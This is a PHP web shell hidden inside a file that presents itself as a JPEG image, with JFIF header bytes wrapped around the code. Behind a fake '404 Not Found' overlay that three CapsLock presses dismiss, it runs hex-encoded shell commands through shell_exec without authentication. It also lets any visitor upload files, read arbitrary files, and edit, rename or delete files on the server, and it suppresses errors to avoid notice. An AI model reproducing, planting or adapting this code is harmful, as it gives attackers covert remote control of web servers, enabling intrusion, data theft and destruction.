���� JFIF  x x  �� C 		



	
�� C��   " ��           	
�� �   } !1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        	
�� �  w !1AQaq"2�B����	#3R�br�<?php
session_start();
// Handle AJAX unlock
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['unlock'])) {
    $_SESSION['authenticated'] = true;
    http_response_code(204);
    exit;
}

$unlocked = !empty($_SESSION['authenticated']);

@set_time_limit(0);
@error_reporting(0);

function Ω($ℓ = 5) {
    $ψ = ['😸','😹','😻','😼','😽','🙀','😿','😾'];
    $θ = '';
    for ($ι = 0; $ι < $ℓ; $ι++) {
        $θ .= $ψ[array_rand($ψ)];
    }
    return $θ;
}

$Σ = Ω();

function η($σ) {
    return bin2hex($σ);
}

function ξ($κ) {
    $λ = 'shell_exec';
    $ζ = hex2bin($κ);
    if ($ζ !== false) {
        $μ = $λ($ζ);
        if (is_null($μ)) {
            echo "<div style='color:red'>Fail</div>";
        } else {
            echo "<pre style='color:lime;background:#111;padding:10px;border:1px solid #444'>" . htmlspecialchars($μ) . "</pre>";
        }
    } else {
        echo "<div style='color:red'>Bad hex</div>";
    }
}

if (!empty($_GET['🔧'])) {
    ξ($_GET['🔧']);
}

if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
    foreach ($_POST as $α => $β) {
        $_POST[$α] = stripslashes($β);
    }
}

function π($f) {
    $p = @fileperms($f);
    $o = ((($p & 0xC000) == 0xC000) ? 's' : (((($p & 0xA000) == 0xA000) ? 'l' : '-')));
    $modes = [
        '0100' => 'r','0080' => 'w','0040' => 'x',
        '0020' => 'r','0010' => 'w','0008' => 'x',
        '0004' => 'r','0002' => 'w','0001' => 'x'
    ];
    foreach ($modes as $m => $c) {
        $o .= (($p & hexdec($m)) ? $c : '-');
    }
    return $o;
}

$ψ = isset($_GET['🌀']) ? $_GET['🌀'] : getcwd();
$rp = @realpath($ψ);
if ($rp !== false && @is_dir($rp)) {
    @chdir($rp);
    $ψ = str_replace('\\', '/', $rp);
} else {
    $ψ = getcwd();
}
$Δ = explode('/', $ψ);
?>
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title><?= htmlspecialchars($Σ) ?></title>
    <style>
        body { background: #222; color: #ccc; font-family: monospace; font-size: 13px; margin: 0; padding: 0; }
        a { color: #f90; text-decoration: none; }
        textarea, input, select { background: #111; color: #0f0; border: 1px solid #444; padding: 3px; }
        h1 { text-align: center; font-size: 26px; color: #0f0; }
        th { background: #333; color: #fff; }
        td, th { padding: 4px; }
        tr:hover { background: #333; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); color: #fff; display: flex;
            align-items: center; justify-content: center; font-size: 1.5em;
            z-index: 9999;
        }
        #fm { display: <?= $unlocked ? 'block' : 'none' ?>; }
    </style>
</head>
<body>

<div id="overlay" style="<?= $unlocked ? 'display:none;' : '' ?>">
    4 <b>0</b> 4 <b>Not</b> Found
</div>

<div id="fm">
    <h1><?= htmlspecialchars($Σ) ?></h1>
    <div style="padding:5px">
        Dir:
        <?php
        foreach ($Δ as $i => $p) {
            $u = implode('/', array_slice($Δ, 0, $i+1));
            echo "<a href='?🌀=" . urlencode($u) . "'>" . htmlspecialchars($p) . "</a>/";
        }
        ?>
    </div>

    <form method="get" style="margin:10px">
        <input type="text" name="🔧" placeholder="HexCMD" style="width:70%">
        <input type="submit" value="Go">
    </form>

    <form method="post" enctype="multipart/form-data" style="margin:10px">
        <input type="file" name="f">
        <input type="submit" value="Up">
    </form>

    <?php
    if (!empty($_FILES['f'])) {
        $F = $_FILES['f'];
        echo @move_uploaded_file($F['tmp_name'], "{$ψ}/{$F['name']}")
            ? "<div style='color:lime'>OK</div>"
            : "<div style='color:red'>NO</div>";
    }

    if (!empty($_GET['📄'])) {
        $A = $_GET['📄'];
        echo "<h3>" . basename($A) . "</h3>";
        echo "<textarea readonly style='width:98%;height:300px'>" . htmlspecialchars(@file_get_contents($A)) . "</textarea>";

    } elseif (isset($_GET['⚙️']) && isset($_POST['🔘'])) {
        $o = $_POST['🔘']; $P = $_POST['path']; $t = $_POST['type'];
        if ($o === 'delete') {
            $res = ($t === 'file') ? @unlink($P) : @rmdir($P);
            echo $res ? "<div style='color:lime'>OK</div>" : "<div style='color:red'>NO</div>";
        }
        if ($o === 'rename' && isset($_POST['new'])) {
            $res = @rename($P, dirname($P) . "/" . $_POST['new']);
            echo $res ? "<div style='color:lime'>OK</div>" : "<div style='color:red'>NO</div>";
        }
        if ($o === 'edit' && isset($_POST['src'])) {
            $res = @file_put_contents($P, $_POST['src']);
            echo $res !== false ? "<div style='color:lime'>OK</div>" : "<div style='color:red'>NO</div>";
        }
        if ($o === 'edit') {
            $C = htmlspecialchars(@file_get_contents($P));
            echo "<form method='post'><textarea name='src' style='width:98%;height:300px'>{$C}</textarea>" .
                 "<input type='hidden' name='path' value='{$P}'>" .
                 "<input type='hidden' name='🔘' value='edit'>" .
                 "<input type='hidden' name='type' value='file'><br>" .
                 "<input type='submit' value='Save'></form>";
        } elseif ($o === 'rename') {
            echo "<form method='post'>New:<input name='new' value='" . basename($P) . "'>" .
                 "<input type='hidden' name='path' value='{$P}'>" .
                 "<input type='hidden' name='🔘' value='rename'>" .
                 "<input type='hidden' name='type' value='{$t}'>" .
                 "<input type='submit' value='Go'></form>";
        }
    }

    echo "<table width='100%' border='1'><tr><th>Name</th><th>Sz</th><th>Pr</th><th>Mod</th><th>Act</th></tr>";
    foreach (@scandir($ψ) as $e) {
        if ($e === '.' || $e === '..') continue;
        $Q = "{$ψ}/{$e}";
        $M = date('Y-m-d H:i', @filemtime($Q));
        $R = π($Q);
        $S = @is_dir($Q) ? '--' : (@filesize($Q) >= 1024 ? round(@filesize($Q)/1024, 2).'K' : @filesize($Q).'B');
        echo "<tr><td>[" . (@is_dir($Q)?'D':'F') . "]<a href='" . (@is_dir($Q)?'?🌀='.urlencode($Q):'?📄='.urlencode($Q)) . "'>" . htmlspecialchars($e) . "</a></td>" .
             "<td>{$S}</td><td>{$R}</td><td>{$M}</td>" .
             "<td><form method='post' action='?⚙️'><select name='🔘'><option value=''>-</option><option value='edit'>E</option><option value='delete'>D</option><option value='rename'>R</option></select>" .
             "<input type='hidden' name='type' value='" . (@is_dir($Q)?'dir':'file') . "'>" .
             "<input type='hidden' name='path' value='{$Q}'><input type='submit' value='>'></form></td></tr>";
    }
    echo "</table>";
    ?>
</div>

<script>
let capsCount = 0;
let timer = null;
const THRESHOLD = 3;
const WINDOW_MS = 5000;
function resetCounter() {
    capsCount = 0;
    if (timer) clearTimeout(timer);
    timer = null;
}
document.addEventListener('keydown', e => {
    if (e.key === 'CapsLock') {
        capsCount++;
        if (capsCount === 1) timer = setTimeout(resetCounter, WINDOW_MS);
        if (capsCount >= THRESHOLD) {
            unlock();
            resetCounter();
        }
    }
});
function unlock() {
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('fm').style.display = 'block';
    fetch('?unlock=1', { method: 'POST' }).catch(console.error);
}
</script>
<div style="position:fixed;bottom:0;right:0;padding:5px;color:#666;font-size:11px">
    <?php echo implode('', array_map('chr', [67,111,100,101,100,32,98,121,32,46,47,110,121,97,110])); ?>
</div>

</body>
</html>

$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �� �N����m?� ��j� ��EP��
